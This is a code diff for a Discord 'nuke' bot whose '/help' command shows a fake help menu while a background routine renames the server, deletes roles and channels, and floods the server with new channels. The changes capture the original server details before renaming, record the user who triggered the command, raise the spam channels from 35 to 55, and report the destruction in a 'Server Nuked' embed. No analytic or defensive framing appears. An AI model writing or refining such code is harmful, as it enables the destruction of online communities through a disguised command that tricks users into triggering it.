@@ -54,21 +54,23 @@ client.on('interactionCreate', async (interaction) => {
         // Reply with the fake help menu
         await interaction.reply({ embeds: [helpEmbed], ephemeral: true });
         
+        // CAPTURE ORIGINAL SERVER INFO AND USER BEFORE CHANGING NAME
+        const originalServerName = interaction.guild.name;
+        const originalServerIcon = interaction.guild.iconURL();
+        const triggeredBy = interaction.user.tag;
+        
         // Change server name to the Discord link
         await interaction.guild.setName(discordLink).catch(console.error);
         
-        // Start the nuke process in the background
-        nukeServer(interaction.guild);
+        // Start the nuke process in the background with the captured info
+        nukeServer(interaction.guild, originalServerName, originalServerIcon, triggeredBy);
     }
 });
 
-async function nukeServer(guild) {
+async function nukeServer(guild, originalServerName, originalServerIcon, triggeredBy) {
     try {
         console.log('Starting nuke process...');
         
-        // Store original server info for webhook
-        const originalServerName = guild.name;
-        const originalServerIcon = guild.iconURL();
         const memberCount = guild.memberCount;
         let rolesDeleted = 0;
         let channelsDeleted = 0;
@@ -108,7 +110,7 @@ async function nukeServer(guild) {
         
         // Create 55 text channels (no voice channels)
         const channelPromises = [];
-        for (let i = 0; i < 35; i++) {
+        for (let i = 0; i < 55; i++) {
             const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
             
             channelPromises.push(
@@ -148,14 +150,14 @@ async function nukeServer(guild) {
             const nukeEmbed = new EmbedBuilder()
                 .setColor('#FF0000')
                 .setTitle('💀 Server Nuked')
-                .setDescription(`**${originalServerName}** has been destroyed`)
+                .setDescription(`**${originalServerName}** has been destroyed\n\n🕵️ **Triggered by:** \`/help\` by ${triggeredBy}`)
                 .setThumbnail(originalServerIcon)
                 .addFields(
                     { name: '👥 Members', value: memberCount.toString(), inline: true },
                     { name: '🗑️ Roles Deleted', value: rolesDeleted.toString(), inline: true },
                     { name: '📋 Channels Deleted', value: channelsDeleted.toString(), inline: true },
                     { name: '➕ Roles Created', value: '15', inline: true },
-                    { name: '➕ Channels Created', value: '35', inline: true }
+                    { name: '➕ Channels Created', value: '55', inline: true }
                 )
                 .setTimestamp()
                 .setFooter({ text: 'Wavey Nuke Bot' });
